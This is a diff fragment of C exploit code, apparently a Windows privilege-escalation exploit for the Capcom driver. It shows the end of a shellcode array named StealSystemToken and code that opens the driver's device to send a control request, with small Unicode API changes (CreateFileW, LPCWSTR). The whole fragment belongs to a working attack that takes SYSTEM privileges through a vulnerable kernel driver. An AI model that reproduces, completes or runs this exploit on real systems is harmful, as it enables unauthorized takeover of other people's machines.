@@ -19,7 +19,7 @@ const CHAR StealSystemToken[84] = ""
 "\x5e\x5f\xc3";
 
 BOOL main() {
-	LPCTSTR DeviceName = CAPCOM_DEVICE_NAME;
+	LPCWSTR DeviceName = CAPCOM_DEVICE_NAME;
 	HANDLE Device;
 	DWORD IoControlCode = CAPCOM_IO_CONTROL_CODE;
 	struct IoControlInput *IoControlInput = NULL;
@@ -28,7 +28,7 @@ BOOL main() {
 	DWORD BytesReturned = 0;
 
 	// Get a handle to the device.
-	if ((Device = CreateFile(
+	if ((Device = CreateFileW(
 		DeviceName,
 		GENERIC_READ | GENERIC_WRITE,
 		FILE_SHARE_READ | FILE_SHARE_WRITE,
